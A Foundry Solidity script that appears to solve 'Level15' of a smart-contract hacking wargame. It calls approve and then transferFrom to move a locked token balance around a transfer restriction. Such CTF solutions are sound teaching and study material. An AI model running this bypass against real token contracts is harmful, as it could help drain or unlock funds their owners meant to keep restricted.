// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level15.sol";

contract AttackerScript is Script {
    Level15 public level15 = Level15(0x4b4EB0f55d24d57f81Af41b32159d0E566e9b7B7);
    bytes32 public value;


    function run() public {
      address perso = vm.addr(1); // put your public address here associated with the .env private_key
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

      uint256 totalBalance = level15.balanceOf(perso);

      //use transferFrom, first approve ourself as spender, then call transferFrom
      level15.approve(perso, totalBalance);
      level15.transferFrom(perso, vm.addr(2), totalBalance);
      console.log("remaining", level15.balanceOf(perso));
      vm.stopBroadcast();
    }
}
